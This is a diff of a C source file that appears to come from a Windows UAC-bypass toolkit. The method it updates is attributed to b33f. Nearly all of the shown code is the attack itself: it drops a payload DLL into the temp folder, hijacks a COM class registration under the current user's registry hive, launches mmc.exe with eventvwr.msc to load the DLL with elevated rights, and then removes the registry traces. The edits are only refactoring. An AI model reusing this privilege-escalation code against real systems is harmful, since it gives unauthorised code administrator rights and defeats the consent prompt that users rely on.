@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2017
+*  (C) COPYRIGHT AUTHORS, 2017 - 2019
 *
 *  TITLE:       B33F.C
 *
-*  VERSION:     2.78
+*  VERSION:     3.17
 *
-*  DATE:        30 July 2017
+*  DATE:        18 Mar 2019
 *
 *  UAC bypass method from Ruben Boonen aka b33f.
 *
@@ -19,7 +19,7 @@
 #include "global.h"
 
 /*
-* ucmMethodCOMHandlers
+* ucmCOMHandlersMethod
 *
 * Purpose:
 *
@@ -27,12 +27,13 @@
 * https://github.com/FuzzySecurity/DefCon25/blob/master/DefCon25_UAC-0day-All-Day_v1.2.pdf
 *
 */
-BOOL ucmMethodCOMHandlers(
-    PVOID ProxyDll,
-    DWORD ProxyDllSize
+NTSTATUS ucmCOMHandlersMethod(
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
 )
 {
-    BOOL     bCond = FALSE, bResult = FALSE;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
+
     SIZE_T   sz = 0;
     HKEY     hKey = NULL;
     LRESULT  lResult;
@@ -40,15 +41,12 @@ BOOL ucmMethodCOMHandlers(
 
     WCHAR szBuffer[MAX_PATH * 2], szRegBuffer[MAX_PATH * 4];
 
-    if ((ProxyDll == NULL) || (ProxyDllSize == 0))
-        return bResult;
-
     do {
 
         //
         // Drop payload dll to the %temp%
         //
-        _strcpy(szBuffer, g_ctx.szTempDirectory);
+        _strcpy(szBuffer, g_ctx->szTempDirectory);
         _strcat(szBuffer, MYSTERIOUSCUTETHING);
         _strcat(szBuffer, TEXT(".dll"));
         if (!supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize))
@@ -61,7 +59,7 @@ BOOL ucmMethodCOMHandlers(
         //
         RtlSecureZeroMemory(&szRegBuffer, sizeof(szRegBuffer));
         _strcpy(szRegBuffer, T_REG_SOFTWARECLASSESCLSID);
-        _strcat(szRegBuffer, T_CLSID_EVENTVWR_BYPASSS);
+        _strcat(szRegBuffer, T_CLSID_EVENTVWR_BYPASS);
         _strcat(szRegBuffer, T_REG_INPROCSERVER32);
 
         hKey = NULL;
@@ -113,7 +111,7 @@ BOOL ucmMethodCOMHandlers(
         //
         RtlSecureZeroMemory(&szRegBuffer, sizeof(szRegBuffer));
         _strcpy(szRegBuffer, T_REG_SOFTWARECLASSESCLSID);
-        _strcat(szRegBuffer, T_CLSID_EVENTVWR_BYPASSS);
+        _strcat(szRegBuffer, T_CLSID_EVENTVWR_BYPASS);
         _strcat(szRegBuffer, T_REG_SHELLFOLDER);
         hKey = NULL;
         lResult = RegCreateKeyEx(HKEY_CURRENT_USER, szRegBuffer, 0, NULL,
@@ -159,9 +157,10 @@ BOOL ucmMethodCOMHandlers(
         //
         // Run target app.
         //
-        bResult = supRunProcess(MMC_EXE, EVENTVWR_MSC);
+        if (supRunProcess(MMC_EXE, EVENTVWR_MSC))
+            MethodResult = STATUS_SUCCESS;
 
-    } while (bCond);
+    } while (FALSE);
 
     if (hKey != NULL)
         RegCloseKey(hKey);
@@ -169,24 +168,24 @@ BOOL ucmMethodCOMHandlers(
     //
     // Cleanup.
     //
-    if (bResult) {
+    if (NT_SUCCESS(MethodResult)) {
         RtlSecureZeroMemory(&szRegBuffer, sizeof(szRegBuffer));
         _strcpy(szRegBuffer, T_REG_SOFTWARECLASSESCLSID);
-        _strcat(szRegBuffer, T_CLSID_EVENTVWR_BYPASSS);
+        _strcat(szRegBuffer, T_CLSID_EVENTVWR_BYPASS);
         _strcat(szRegBuffer, T_REG_SHELLFOLDER);
         RegDeleteKey(HKEY_CURRENT_USER, szRegBuffer);
 
         RtlSecureZeroMemory(&szRegBuffer, sizeof(szRegBuffer));
         _strcpy(szRegBuffer, T_REG_SOFTWARECLASSESCLSID);
-        _strcat(szRegBuffer, T_CLSID_EVENTVWR_BYPASSS);
+        _strcat(szRegBuffer, T_CLSID_EVENTVWR_BYPASS);
         _strcat(szRegBuffer, T_REG_INPROCSERVER32);
         RegDeleteKey(HKEY_CURRENT_USER, szRegBuffer);
 
         RtlSecureZeroMemory(&szRegBuffer, sizeof(szRegBuffer));
         _strcpy(szRegBuffer, T_REG_SOFTWARECLASSESCLSID);
-        _strcat(szRegBuffer, T_CLSID_EVENTVWR_BYPASSS);
+        _strcat(szRegBuffer, T_CLSID_EVENTVWR_BYPASS);
         RegDeleteKey(HKEY_CURRENT_USER, szRegBuffer);
     }
 
-    return bResult;
+    return MethodResult;
 }
